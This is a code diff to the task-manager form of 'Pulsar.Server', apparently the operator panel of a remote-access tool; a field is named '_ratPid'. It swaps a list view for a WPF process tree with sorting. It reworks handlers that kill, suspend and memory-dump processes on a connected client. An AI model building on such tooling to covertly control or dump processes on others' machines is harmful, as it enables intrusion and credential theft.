@@ -3,6 +3,7 @@ using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.TaskManager;
 using Pulsar.Common.Models;
 using Pulsar.Server.Controls;
+using Pulsar.Server.Controls.Wpf;
 using Pulsar.Server.Forms.DarkMode;
 using Pulsar.Server.Helper;
 using Pulsar.Server.Messages;
@@ -35,6 +36,12 @@ namespace Pulsar.Server.Forms
 
         private int? _ratPid = null;
 
+        private readonly ProcessTreeView _processTreeView;
+
+        private Common.Models.Process[] _currentProcesses = Array.Empty<Common.Models.Process>();
+        private ProcessTreeSortColumn _sortColumn = ProcessTreeSortColumn.Name;
+        private bool _sortAscending = true;
+
         /// <summary>
         /// Creates a new task manager form for the client or gets the current open form, if there exists one already.
         /// </summary>
@@ -62,12 +69,17 @@ namespace Pulsar.Server.Forms
         {
             _connectClient = client;
             _taskManagerHandler = new TaskManagerHandler(client);
+            _processTreeView = new ProcessTreeView();
 
             RegisterMessageHandler();
             InitializeComponent();
 
             DarkModeManager.ApplyDarkMode(this);
 			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+
+        _processTreeView.SortRequested += ProcessTreeView_SortRequested;
+        _processTreeView.SelectedProcessChanged += ProcessTreeView_SelectedProcessChanged;
+        processTreeHost.Child = _processTreeView;
         }
 
         /// <summary>
@@ -123,17 +135,8 @@ namespace Pulsar.Server.Forms
 
         private void TasksChanged(object sender, Common.Models.Process[] processes)
         {
-            lstTasks.Items.Clear();
-
-            foreach (var process in processes)
-            {
-                ListViewItem lvi =
-                    new ListViewItem(new[] { process.Name, process.Id.ToString(), process.MainWindowTitle });
-                lstTasks.Items.Add(lvi);
-            }
-
-            processesToolStripStatusLabel.Text = $"Processes: {processes.Length}";
-            this.HighlightRatPid();
+            _currentProcesses = processes ?? Array.Empty<Common.Models.Process>();
+            RenderProcesses();
         }
 
         private void TasksChanged(object sender, Common.Models.Process[] processes, int? ratPid)
@@ -171,9 +174,9 @@ namespace Pulsar.Server.Forms
 
         private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem lvi in lstTasks.SelectedItems)
+            foreach (var process in GetSelectedProcesses())
             {
-                _taskManagerHandler.EndProcess(int.Parse(lvi.SubItems[1].Text));
+                _taskManagerHandler.EndProcess(process.Id);
             }
         }
 
@@ -193,17 +196,17 @@ namespace Pulsar.Server.Forms
 
         private void dumpMemoryToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem lvi in lstTasks.SelectedItems)
+            foreach (var process in GetSelectedProcesses())
             {
-                _taskManagerHandler.DumpProcess(int.Parse(lvi.SubItems[1].Text));
+                _taskManagerHandler.DumpProcess(process.Id);
             }
         }
 
         private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem lvi in lstTasks.SelectedItems)
+            foreach (var process in GetSelectedProcesses())
             {
-                _taskManagerHandler.SuspendProcess(int.Parse(lvi.SubItems[1].Text));
+                _taskManagerHandler.SuspendProcess(process.Id);
             }
         }
 
@@ -225,59 +228,52 @@ namespace Pulsar.Server.Forms
             }
         }
 
-        private void lstTasks_ColumnClick(object sender, ColumnClickEventArgs e)
+        private void ProcessTreeView_SortRequested(object sender, SortRequestedEventArgs e)
         {
-            if (lstTasks.Tag is Tuple<int, bool> lastSort && lastSort.Item1 == e.Column)
+            if (_sortColumn == e.Column)
             {
-                lstTasks.Tag = Tuple.Create(e.Column, !lastSort.Item2);
+                _sortAscending = !_sortAscending;
             }
             else
             {
-                lstTasks.Tag = Tuple.Create(e.Column, true);
+                _sortColumn = e.Column;
+                _sortAscending = true;
             }
-            bool ascending = ((Tuple<int, bool>)lstTasks.Tag).Item2;
 
-            lstTasks.ListViewItemSorter = new ListViewItemComparer(e.Column, ascending);
-            lstTasks.Sort();
+            RenderProcesses();
         }
 
-        private class ListViewItemComparer : System.Collections.IComparer
+        private void ProcessTreeView_SelectedProcessChanged(object sender, EventArgs e)
         {
-            private int col;
-            private bool ascending;
-            public ListViewItemComparer(int column, bool ascending)
-            {
-                this.col = column;
-                this.ascending = ascending;
-            }
-            public int Compare(object x, object y)
-            {
-                string a = ((ListViewItem)x).SubItems[col].Text;
-                string b = ((ListViewItem)y).SubItems[col].Text;
-                int result = string.Compare(a, b, StringComparison.CurrentCultureIgnoreCase);
-                return ascending ? result : -result;
-            }
+            //TODO: Add details panel update
         }
 
-        private void HighlightRatPid()
+        /// <summary>
+        /// Rebuilds the WPF process tree hierarchy so parent and child processes stay grouped.
+        /// </summary>
+        private void RenderProcesses()
         {
-            if (_ratPid == null) return;
-            foreach (ListViewItem item in lstTasks.Items)
+            if (processTreeHost != null)
             {
-                if (item.Tag == null)
-                    item.Tag = item.BackColor;
-
-                if (item.SubItems.Count > 1 && int.TryParse(item.SubItems[1].Text, out int pid) && pid == _ratPid)
-                {
-                    item.BackColor = System.Drawing.Color.LightGreen;
-                }
-                else
-                {
-                    // restore old color fr
-                    if (item.Tag is System.Drawing.Color originalColor)
-                        item.BackColor = originalColor;
-                }
+                processTreeHost.Enabled = _taskManagerHandler != null;
             }
+
+            _processTreeView.UpdateProcesses(_currentProcesses, _sortColumn, _sortAscending, _ratPid);
+
+            var sortLabel = _sortColumn switch
+            {
+                ProcessTreeSortColumn.Pid => "PID",
+                ProcessTreeSortColumn.WindowTitle => "Title",
+                _ => "Name"
+            };
+
+            var orderLabel = _sortAscending ? "asc" : "desc";
+            processesToolStripStatusLabel.Text = $"Processes: {_currentProcesses.Length} | Sort: {sortLabel} ({orderLabel})";
+        }
+
+        private IEnumerable<Common.Models.Process> GetSelectedProcesses()
+        {
+            return _processTreeView?.SelectedProcesses ?? Array.Empty<Common.Models.Process>();
         }
     }
 }
